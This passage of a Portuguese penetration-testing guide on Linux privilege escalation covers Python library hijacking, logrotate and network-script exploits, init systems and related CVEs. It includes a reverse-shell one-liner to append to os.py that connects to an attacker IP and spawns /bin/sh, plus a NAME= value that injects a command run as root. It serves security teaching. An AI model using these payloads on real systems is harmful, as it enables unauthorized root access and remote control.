Se você souber de **onde** um script python vai ser executado e você **puder escrever dentro** dessa pasta ou puder **modificar python libraries**, você pode modificar a OS library e backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Para **backdoor the library** basta adicionar ao final da os.py library a seguinte linha (altere IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploração do logrotate

Uma vulnerabilidade em `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pai potencialmente obtenham privilégios escalados. Isso acontece porque `logrotate`, frequentemente executado como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar permissões não apenas em _/var/log_ mas também em qualquer diretório onde a rotação de logs seja aplicada.

> [!TIP]
> Esta vulnerabilidade afeta `logrotate` na versão `3.18.0` e anteriores

Mais informações detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar essa vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Essa vulnerabilidade é muito similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** então sempre que encontrar que pode alterar logs, verifique quem está gerenciando esses logs e veja se é possível escalar privilégios substituindo os logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então o seu **system is pwned**.

Network scripts, _ifcg-eth0_ por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses network scripts não é tratado corretamente. Se você tiver **espaço em branco no nome o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note o espaço em branco entre Network e /bin/id_)

### **init, init.d, systemd, and rc.d**

O diretório `/etc/init.d` abriga **scripts** para System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` de serviços. Estes podem ser executados diretamente ou através de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um sistema de **gerenciamento de serviços** mais recente introduzido pelo Ubuntu, que usa arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, scripts SysVinit ainda são utilizados junto com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.

**systemd** surge como um gerenciador moderno de inicialização e serviços, oferecendo recursos avançados como inicialização de daemons sob demanda, gerenciamento de automount e snapshots de estado do sistema. Ele organiza arquivos em `/usr/lib/systemd/` para pacotes de distribuição e em `/etc/systemd/system/` para modificações do administrador, simplificando o processo de administração do sistema.

## Outros Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks comumente hookam um syscall para expor funcionalidades privilegiadas do kernel a um manager em userspace. Autenticação fraca do manager (por exemplo, checagens de assinatura baseadas em FD-order ou esquemas de senha pobres) pode permitir que um app local se passe pelo manager e escale para root em dispositivos já enraizados. Saiba mais e detalhes de exploração aqui:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

A descoberta de serviços dirigida por regex no VMware Tools/Aria Operations pode extrair um caminho de binário a partir de linhas de comando de processos e executá-lo com -v sob um contexto privilegiado. Padrões permissivos (por exemplo, usando \S) podem casar com listeners colocados por um atacante em locais graváveis (por exemplo, /tmp/httpd), levando à execução como root (CWE-426 Untrusted Search Path).

Saiba mais e veja um padrão generalizado aplicável a outras stacks de discovery/monitoring aqui:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
